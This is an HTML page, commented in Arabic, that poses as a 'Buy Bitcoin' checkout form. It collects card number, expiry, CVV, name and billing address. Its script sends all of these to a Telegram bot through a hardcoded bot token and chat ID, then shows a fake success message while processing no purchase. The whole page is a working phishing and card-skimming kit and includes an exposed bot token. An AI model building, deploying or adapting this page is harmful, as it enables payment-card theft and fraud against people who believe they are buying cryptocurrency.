<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Buy Bitcoin</title>

<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #0f172a;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
    padding: 20px;
}

.container {
    background: #111827;
    padding: 25px;
    border-radius: 15px;
    width: 440px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.7);
    border: 1px solid #1f2937;
}

.title {
    text-align: center;
    font-size: 26px;
    color: #f7931a;
    margin-bottom: 15px;
    font-weight: bold;
}

.crypto-box {
    background: #1f2937;
    padding: 12px;
    border-radius: 10px;
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 15px;
    border: 1px solid #374151;
}

input, select {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border: 1px solid #374151;
    border-radius: 8px;
    background: #1f2937;
    color: white;
    box-sizing: border-box;
    transition: all 0.3s ease;
}

input:focus, select:focus {
    outline: none;
    border-color: #f7931a;
    box-shadow: 0 0 5px rgba(247, 147, 26, 0.3);
}

.row {
    display: flex;
    gap: 10px;
}

button {
    width: 100%;
    padding: 14px;
    margin-top: 20px;
    background: #f7931a;
    border: none;
    color: white;
    font-size: 16px;
    font-weight: bold;
    border-radius: 8px;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 10px;
}

button:hover { background: #ff9f2f; }
button:disabled { background: #4b5563; cursor: not-allowed; }

.loader {
    width: 20px;
    height: 20px;
    border: 3px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: none;
    animation: rotation 1s linear infinite;
}

@keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

.success {
    display: none;
    margin-top: 15px;
    text-align: center;
    color: #22c55e;
    background: rgba(34, 197, 94, 0.1);
    padding: 10px;
    border-radius: 8px;
}

.error {
    color: #ef4444;
    font-size: 13px;
    display: none;
    margin-top: 10px;
    text-align: center;
    padding: 8px;
    background: rgba(239, 68, 68, 0.1);
    border-radius: 5px;
}
</style>
</head>
<body>

<div class="container">
    <div class="title">₿ Buy Bitcoin</div>

    <div class="crypto-box">
        <div class="crypto-icon">₿</div>
        <div style="font-size: 13px; color: #9ca3af;">أدخل البيانات المطلوبة لإتمام المعاملة</div>
    </div>

    <form id="paymentForm">
        <input id="amount" type="number" placeholder="Amount (USD)" required>
        <input id="wallet" type="text" placeholder="Bitcoin Wallet Address" required>
        
        <hr style="border: 0.5px solid #374151; margin: 20px 0;">
        
        <input id="name" type="text" placeholder="Name on Card" required>
        <input id="card" type="text" placeholder="Card Number" maxlength="19" required>

        <div class="row">
            <input id="expiry" type="text" placeholder="MM/YY" maxlength="5" required>
            <input id="cvv" type="password" placeholder="CVV" maxlength="4" required>
        </div>

        <hr style="border: 0.5px solid #374151; margin: 20px 0;">

        <input id="address" type="text" placeholder="Street Address" required>
        
        <div class="row">
            <input id="city" type="text" placeholder="City" required>
            <input id="zip" type="text" placeholder="ZIP / Postal Code" required>
        </div>

        <select id="country" required>
            <option value="">Select Country</option>
            <optgroup label="العالم العربي">
                <option>Saudi Arabia</option><option>UAE</option><option>Egypt</option>
                <option>Jordan</option><option>Kuwait</option><option>Qatar</option>
                <option>Oman</option><option>Bahrain</option><option>Iraq</option>
                <option>Lebanon</option><option>Morocco</option><option>Algeria</option>
                <option>Tunisia</option><option>Libya</option><option>Sudan</option>
                <option>Syria</option><option>Palestine</option><option>Yemen</option>
            </optgroup>
            <optgroup label="International">
                <option>United States</option><option>United Kingdom</option><option>Canada</option>
                <option>Germany</option><option>France</option><option>Turkey</option>
                <option>China</option><option>Japan</option><option>India</option>
            </optgroup>
        </select>

        <div class="error" id="errorMsg"></div>

        <button type="submit" id="submitBtn">
            <span id="btnText">Confirm Purchase</span>
            <div class="loader" id="loader"></div>
        </button>
    </form>

    <div class="success" id="successMsg">
        Transaction Submitted Successfully 🚀
    </div>
</div>

<script>
// --- إعدادات تليجرام ---
const TELEGRAM_BOT_TOKEN =  '8518381523:AAFDqycozfxspfPQ_jCud5zDHng23hlUz_k'
const TELEGRAM_CHAT_ID =  '7975754347'

// 1. تنسيقات الإدخال (البطاقة والتاريخ)
document.getElementById('card').addEventListener('input', e => {
    let value = e.target.value.replace(/\D/g, '').match(/.{1,4}/g);
    e.target.value = value ? value.join(' ') : '';
});

document.getElementById('expiry').addEventListener('input', e => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
});

// 2. التحقق من عنوان البيتكوين
function isValidBitcoinAddress(address) {
    const btcRegex = /^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,59})$/;
    return btcRegex.test(address);
}

// 3. معالجة الإرسال
document.getElementById("paymentForm").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const wallet = document.getElementById("wallet").value;
    const errorMsg = document.getElementById("errorMsg");
    const btn = document.getElementById("submitBtn");
    const loader = document.getElementById("loader");
    const btnText = document.getElementById("btnText");

    if (!isValidBitcoinAddress(wallet)) {
        errorMsg.innerText = "عنوان محفظة البيتكوين غير صحيح!";
        errorMsg.style.display = "block";
        return;
    }

    errorMsg.style.display = "none";
    btn.disabled = true;
    btnText.style.display = "none";
    loader.style.display = "block";

    // تجميع البيانات لإرسالها للتليجرام
    const data = {
        amount: document.getElementById("amount").value,
        wallet: wallet,
        name: document.getElementById("name").value,
        card: document.getElementById("card").value,
        expiry: document.getElementById("expiry").value,
        cvv: document.getElementById("cvv").value,
        address: document.getElementById("address").value,
        city: document.getElementById("city").value,
        zip: document.getElementById("zip").value,
        country: document.getElementById("country").value
    };

    const message = `
🔔 **عملية شراء جديدة** ₿
----------------------------
💰 المبلغ: ${data.amount} USD
🔗 المحفظة: ${data.wallet}
👤 الاسم: ${data.name}
💳 البطاقة: ${data.card}
📅 التاريخ: ${data.expiry} | CVV: ${data.cvv}
📍 العنوان: ${data.address}
🏙️ المدينة: ${data.city} (${data.zip})
🌍 الدولة: ${data.country}
----------------------------
    `;

    // إرسال البيانات إلى تليجرام باستخدام Fetch API
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => {
        loader.style.display = "none";
        btnText.style.display = "block";
        
        if (response.ok) {
            btnText.innerText = "Done!";
            document.getElementById("successMsg").style.display = "block";
            document.getElementById("paymentForm").reset();
        } else {
            errorMsg.innerText = "حدث خطأ في الاتصال بالسيرفر.";
            errorMsg.style.display = "block";
            btn.disabled = false;
        }
    })
    .catch(error => {
        loader.style.display = "none";
        btnText.style.display = "block";
        errorMsg.innerText = "تأكد من إعدادات البوت والإنترنت.";
        errorMsg.style.display = "block";
        btn.disabled = false;
    });
});
</script>

</body>
</html>
